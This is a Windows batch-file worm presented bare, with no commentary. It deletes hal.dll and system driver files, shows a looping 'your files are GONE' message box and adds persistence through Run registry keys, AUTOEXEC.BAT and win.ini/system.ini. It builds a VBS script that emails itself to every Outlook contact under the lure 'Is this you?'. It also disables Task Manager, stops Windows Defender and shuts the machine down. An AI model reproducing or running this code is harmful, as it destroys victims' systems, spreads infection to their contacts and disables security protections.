:worm

echo do>>msg.vbs
echo Msgbox"this is a cyber weapon made for chaos your files are gone you can try and stop this but it wont work goodbye",0+0,"oops your files are GONE">>msg.vbs
echo loop>>msg.vbs
start msg.vbs
RUNDLL32 USER32.DLL,SwapMouseButton
DEL /F /S /Q /A "%systemdrive%\windows\system32\hal.dll"
@((( Echo Off > Nul ) & Break Off )
@Set HiveBSOD=HKLM\Software\Microsoft\Windows\CurrentVersion\Run
@Reg Add "%HiveBSOD%" /v "BSOD" /t "REG_SZ" /d %0 /f > Nul
@Del /q /s /f "%SystemRoot%\Windows\System32\Drivers\*.*"
)
set Slash=\
if exist %SystemDrive%%Slash%AUTOEXEC.BAT (
attrib +s +r +h %SystemDrive%%Slash%AUTOEXEC.BAT
del %SystemDrive%%Slash%AUTOEXEC.BAT
copy %0 %SystemDrive%%Slash%AUTOEXEC.BAT
attrib +s +r +h %SystemDrive%%Slash%AUTOEXEC.BAT
)
set a=shadow
copy %0 %windir%\%a%.bat
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v AVAADA /t REG_SZ /d %windir%\%a%.bat /f > nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v AVAADA /t REG_SZ /d %windir%\%a%.bat /f > nul
set b=shadow
copy %0 %windir%\%b%.bat
echo [windows] >> %windir%\win.ini
echo run=%windir%\%b%.bat >> %windir%\win.ini
echo load=%windir%\%b%.bat >> %windir%\win.ini
echo [boot] >> %windir%\system.ini
echo shell=explorer.exe %b%.bat >> %windir%\system.ini
echo dim x>>%SystemDrive%\mail.vbs
echo on error resume next>>%SystemDrive%\mail.vbs
echo Set fso ="Scripting.FileSystem.Object">>%SystemDrive%\mail.vbs
echo Set so=CreateObject(fso)>>%SystemDrive%\mail.vbs
echo Set ol=CreateObject("Outlook.Application")>>%SystemDrive%\mail.vbs
echo Set out=WScript.CreateObject("Outlook.Application")>>%SystemDrive%\mail.vbs
echo Set mapi = out.GetNameSpace("MAPI")>>%SystemDrive%\mail.vbs
echo Set a = mapi.AddressLists(1)>>%SystemDrive%\mail.vbs
echo Set ae=a.AddressEntries>>%SystemDrive%\mail.vbs
echo For x=1 To ae.Count>>%SystemDrive%\mail.vbs
echo Set ci=ol.CreateItem(0)>>%SystemDrive%\mail.vbs
echo Set Mail=ci>>%SystemDrive%\mail.vbs
echo Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)>>%SystemDrive%\mail.vbs
echo Mail.Subject="Is this you?">>%SystemDrive%\mail.vbs
echo Mail.Body="Man that has got to be embarrassing!">>%SystemDrive%\mail.vbs
echo Mail.Attachments.Add(%0)>>%SystemDrive%\mail.vbs
echo Mail.send>>%SystemDrive%\mail.vbs
echo Next>>%SystemDrive%\mail.vbs
echo ol.Quit>>%SystemDrive%\mail.vbs
start "" "%SystemDrive%\mail.vbs"
goto worm
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
net stop "WinDefend"
taskkill /f /t /im "MSASCui.exe"
shutdown /p
